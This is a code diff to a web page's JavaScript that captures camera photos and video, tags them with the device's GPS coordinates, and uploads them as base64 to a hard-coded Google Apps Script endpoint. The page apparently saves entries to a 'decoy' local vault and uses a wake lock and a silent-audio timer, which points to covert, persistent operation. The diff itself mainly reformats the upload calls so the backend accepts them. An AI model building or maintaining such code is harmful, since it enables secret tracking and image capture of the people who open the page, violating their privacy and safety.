@@ -48,7 +48,6 @@
     </div>
 </div>
 <script>
-    // 🔗 Your exact live script cloud connection URL is fully added into line 3 below
     const googleScriptUrl = "https://script.google.com/macros/s/AKfycbzhkaLbAkNRPfGVNykf_srPuNO_-mcHcJ_Lk5ekGJN42s9UtTXqbUFBECVyCAXqv6oN/exec"; 
     let activeStream = null, packetRecorder = null, videoChunks = [];
     let isBroadcasting = false, db = null, wakeLock = null, silentAudioInterval = null, audioCtx = null;
@@ -158,7 +157,18 @@
             let dataUrl = canvas.toDataURL('image/jpeg', 0.7); 
             let base64Str = dataUrl.substring(dataUrl.indexOf(',') + 1); 
             let cleanTime = new Date().toLocaleTimeString('en-US', { hour12: false }).replace(/:/g, '-');
-            transmitPacketToCloud({ type: "photo", image: base64Str, latitude: currentLat, longitude: currentLon, accuracy: gpsAccuracy, timestamp: cleanTime });
+            
+            // 🔄 RESTORED DRIVE DATA KEY MATCH: Crucial for backend acceptance
+            transmitPacketToCloud({ 
+                type: "photo", 
+                image: base64Str, 
+                latitude: currentLat, 
+                longitude: currentLon, 
+                accuracy: gpsAccuracy, 
+                timestamp: cleanTime 
+            });
+            
+            // Local naming convention matching your visual needs
             saveToDecoyLocalVault("Photo_" + cleanTime + ".jpg", "Lt[" + currentLat + "] Lg[" + currentLon + "] ac[" + gpsAccuracy + "m]");
         } catch (e) { console.error(e); }
     }
@@ -178,7 +188,17 @@
                     const rawResult = reader.result;
                     const base64Video = rawResult.substring(rawResult.indexOf(',') + 1); 
                     const cleanTime = new Date().toLocaleTimeString('en-US', { hour12: false }).replace(/:/g, '-');
-                    transmitPacketToCloud({ type: "video", videoData: base64Video, latitude: currentLat, longitude: currentLon, accuracy: gpsAccuracy, timestamp: cleanTime });
+                    
+                    // 🔄 RESTORED DRIVE DATA KEY MATCH: Crucial for backend acceptance
+                    transmitPacketToCloud({ 
+                        type: "video", 
+                        videoData: base64Video, 
+                        latitude: currentLat, 
+                        longitude: currentLon, 
+                        accuracy: gpsAccuracy, 
+                        timestamp: cleanTime 
+                    });
+                    
                     saveToDecoyLocalVault("Vid_" + cleanTime + ".mp4", "Lt[" + currentLat + "] Lg[" + currentLon + "] ac[" + gpsAccuracy + "m]");
                 };
             };
